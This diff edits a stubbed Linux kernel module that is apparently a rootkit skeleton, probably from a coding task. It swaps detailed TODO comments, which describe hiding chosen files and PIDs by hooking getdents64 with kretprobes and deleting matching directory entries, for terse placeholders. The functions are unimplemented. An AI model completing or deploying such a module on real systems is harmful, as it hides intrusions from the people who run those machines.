@@ -25,27 +25,19 @@ struct rk_target_list {
 static struct rk_target_list file_targets;
 static struct rk_target_list pid_targets;
 
-/* TODO: Implement rk_target_add(list, name)
- * spin_lock_irqsave, check count < max, strscpy, count++, spin_unlock_irqrestore
- */
+// Implement add, remove, and match for the target list.
+
 static int rk_target_add(struct rk_target_list *list, const char *name)
 {
-	/* TODO: implement */
 	return -ENOSYS;
 }
 
-/* TODO: Implement rk_target_remove(list, idx)
- * spin_lock_irqsave, validate idx, memmove to close gap, count--, spin_unlock_irqrestore
- */
 static int rk_target_remove(struct rk_target_list *list, int idx)
 {
-	/* TODO: implement */
 	return -ENOSYS;
 }
 
-/* TODO: Implement rk_target_match(list, name)
- * spin_lock_irqsave, iterate and strcmp, return true/false, spin_unlock_irqrestore
- */
+// Implement rk_target_match and should_hide_dirent.
 
 /* ---- getdents64 interception ---- */
 
@@ -53,35 +45,15 @@ struct getdents_data {
 	void __user *ubuf;
 };
 
-/* TODO: Implement should_hide_dirent(name)
- * Check name against file_targets and pid_targets using rk_target_match.
- */
-
-/* TODO: Implement getdents_entry(ri, regs)
- * __x64_sys_getdents64 is a syscall wrapper: extract nested pt_regs first.
- *   uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0)
- * Then read the user buffer pointer from uregs->si into ri->data.
- * Return 1 if uregs is NULL to skip the return handler.
- */
 static int getdents_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	/* TODO: implement */
+	// Save the user-space dirent buffer pointer.
 	return 0;
 }
 
-/* TODO: Implement getdents_return(ri, regs)
- * Get total byte count from regs_return_value. If <= 0, return.
- * kmalloc a kernel buffer, copy_from_user the dirent buffer.
- * Walk variable-length records: cast (kbuf + off) to struct linux_dirent64.
- * For each record, if should_hide_dirent(d->d_name):
- *   memmove to close the gap, subtract d_reclen from new_total.
- * Otherwise advance off by d_reclen.
- * If total changed: copy_to_user, regs_set_return_value with new total.
- * kfree the buffer.
- */
 static int getdents_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	/* TODO: implement */
+	// Filter matching dirent records from the buffer.
 	return 0;
 }
 
@@ -208,15 +180,14 @@ static int __init rk_init(void)
 	spin_lock_init(&file_targets.lock);
 	spin_lock_init(&pid_targets.lock);
 
-	/* TODO: Register the getdents kretprobe. */
-	/* TODO: Register the mkdir kretprobe. On failure, unregister getdents. */
+	// Register getdents and mkdir probes with goto rollback.
 
 	return 0;
 }
 
 static void __exit rk_exit(void)
 {
-	/* TODO: Unregister mkdir kretprobe, then getdents kretprobe. */
+	// Unregister probes in reverse order.
 }
 
 module_init(rk_init);
